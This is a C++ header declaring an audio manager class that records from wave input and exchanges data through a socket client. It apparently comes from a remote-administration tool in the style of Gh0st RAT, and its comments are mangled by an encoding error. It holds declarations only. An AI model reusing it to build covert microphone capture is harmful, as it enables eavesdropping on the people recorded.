#pragma once
#include "Manager.h"
#include "WavePlayback.h"
#include "WaveRecord.h"

#include <mmsystem.h>
#pragma comment(lib, "Winmm.lib")




struct WAVE_INFO
{
	TCHAR str[1024];//  
	int nIndex;    // �±�
};

class CAudioManager : public CManager
{
public:
	BOOL m_buser;
	CAudioManager(ISocketBase* pClient);
	virtual ~CAudioManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);



	bool Initialize();
	int EnumerateInputLines(TCHAR* szPname, TCHAR* str);
	BOOL sendWaveInfo(WAVE_INFO* Wave_Info, BYTE bToken);

	CAudioCode			m_ACode;     //�����
	CWavePlayback* m_pWavePlayback;  //������Ƶ
	CWaveRecord* m_pWaveRecord;  //��ȡ���ҷ���

private:

};
